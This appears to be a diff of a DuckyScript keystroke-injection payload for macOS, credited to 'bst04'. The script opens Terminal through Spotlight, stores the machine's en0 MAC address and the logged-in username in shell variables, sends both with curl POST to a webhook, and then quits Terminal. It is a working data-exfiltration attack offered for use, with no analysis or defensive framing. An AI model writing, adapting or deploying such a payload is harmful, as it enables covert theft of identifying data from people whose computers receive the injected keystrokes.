@@ -1,3 +1,8 @@
+REM =====================================
+REM payload made by bst04
+REM gets mac address and username into a
+REM webhook
+REM =====================================
 
 DELAY 1000
 GUI SPACE
@@ -6,6 +11,12 @@ STRING TERMINAL
 DELAY 250
 ENTER
 DELAY 250
-STRING networksetup -getmacaddress en0 | pbcopy
+STRING mac=$(networksetup -getmacaddress en0) 
 DELAY 500
 ENTER
+STRING name=$(id -un)
+DELAY 250
+ENTER
+STRING curl -X POST -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "content=User:$name | $mac" https://webhook
+ENTER
+GUI q
